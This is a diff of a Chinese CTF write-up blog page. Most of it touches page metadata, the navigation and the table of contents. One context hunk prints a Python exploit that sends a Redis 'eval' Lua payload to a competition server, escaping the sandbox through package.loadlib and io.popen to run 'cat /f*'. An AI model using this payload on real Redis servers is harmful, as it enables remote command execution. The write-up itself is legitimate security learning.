@@ -89,7 +89,7 @@
 <meta property="og:description" content="前言 为什么说是赛后复现，因为大部分都没做出来，tcl（。">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-03-22T10:16:04.000Z">
-<meta property="article:modified_time" content="2022-03-24T06:19:41.084Z">
+<meta property="article:modified_time" content="2022-03-24T06:22:44.274Z">
 <meta property="article:author" content="liszt_lin">
 <meta property="article:tag" content="-ctf -web">
 <meta name="twitter:card" content="summary">
@@ -380,7 +380,7 @@
 <p>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">session = requests.Session()</span><br><span class="line">rawBody = &quot;&#123;\&quot;query\&quot;:\&quot;INFO\\neval &#x27;local io_l =</span><br><span class="line">package.loadlib(\\\&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\&quot;,</span><br><span class="line">\\\&quot;luaopen_io\\\&quot;); local io = io_l(); local f = io.popen(\\\&quot;cat /f*\\\&quot;,</span><br><span class="line">\\\&quot;r\\\&quot;); local res = f:read(\\\&quot;*a\\\&quot;); f:close(); return res&#x27; 0\&quot;&#125;&quot;</span><br><span class="line">headers = &#123;&quot;Origin&quot;:&quot;http://120.25.155.106:21570&quot;,&quot;Accept&quot;:&quot;*/*&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/99.0.4844.74</span><br><span class="line">Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://120.25.155.106:21570/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;</span><br><span class="line">Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;</span><br><span class="line">response = session.post(&quot;http://120.25.155.106:25502/sendreq&quot;, data=rawBody,</span><br><span class="line">headers=headers)</span><br><span class="line">print(&quot;Status code: %i&quot; % response.status_code)</span><br><span class="line">print(&quot;Response body: %s&quot; % response.content)</span><br></pre></td></tr></table></figure>
 
-<h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><p>babysql和ezphp这两题暂时没时间或者环境原因还没有复现，等之后有条件了再复现。</p>
+<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>babysql和ezphp这两题暂时没时间或者环境原因还没有复现，等之后有条件了再复现。</p>
 <h1 id="红明谷赛道"><a href="#红明谷赛道" class="headerlink" title="红明谷赛道"></a>红明谷赛道</h1><h2 id="MissingFile"><a href="#MissingFile" class="headerlink" title="MissingFile"></a>MissingFile</h2><p>再也不相信取证了，直接string就能搜出来……</p>
 <p>或者010进去搜索字符串也可以</p>
 <h2 id="Fan-website"><a href="#Fan-website" class="headerlink" title="Fan website"></a>Fan website</h2><p><code>www.zip</code>源码泄露，下载下来审计，发现是laminas组件，并且找到下面这段代码：</p>
@@ -463,6 +463,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2022/03/27/%E3%80%90NISACTF%E3%80%91write-up/" rel="prev" title="【NISACTF】write up">
+                【NISACTF】write up <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -538,7 +542,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-count">59</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -600,7 +604,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%99%8E%E7%AC%A6%E8%B5%9B%E9%81%93"><span class="nav-number"></span> <span class="nav-text">虎符赛道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Plain-Text"><span class="nav-number">1.</span> <span class="nav-text">Plain Text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quest-Crash"><span class="nav-number">2.</span> <span class="nav-text">Quest-Crash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quest-RCE"><span class="nav-number">3.</span> <span class="nav-text">Quest-RCE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#other"><span class="nav-number"></span> <span class="nav-text">other</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7%E8%B5%9B%E9%81%93"><span class="nav-number"></span> <span class="nav-text">红明谷赛道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MissingFile"><span class="nav-number">1.</span> <span class="nav-text">MissingFile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fan-website"><span class="nav-number">2.</span> <span class="nav-text">Fan website</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty-calculator"><span class="nav-number">3.</span> <span class="nav-text">Smarty_calculator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">3.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-ya"><span class="nav-number">4.</span> <span class="nav-text">easy_ya</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%99%8E%E7%AC%A6%E8%B5%9B%E9%81%93"><span class="nav-number"></span> <span class="nav-text">虎符赛道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Plain-Text"><span class="nav-number">1.</span> <span class="nav-text">Plain Text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quest-Crash"><span class="nav-number">2.</span> <span class="nav-text">Quest-Crash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quest-RCE"><span class="nav-number">3.</span> <span class="nav-text">Quest-RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#other"><span class="nav-number">4.</span> <span class="nav-text">other</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7%E8%B5%9B%E9%81%93"><span class="nav-number"></span> <span class="nav-text">红明谷赛道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MissingFile"><span class="nav-number">1.</span> <span class="nav-text">MissingFile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fan-website"><span class="nav-number">2.</span> <span class="nav-text">Fan website</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty-calculator"><span class="nav-number">3.</span> <span class="nav-text">Smarty_calculator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">3.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-ya"><span class="nav-number">4.</span> <span class="nav-text">easy_ya</span></a></li></ol></div>
             
 
           </div>
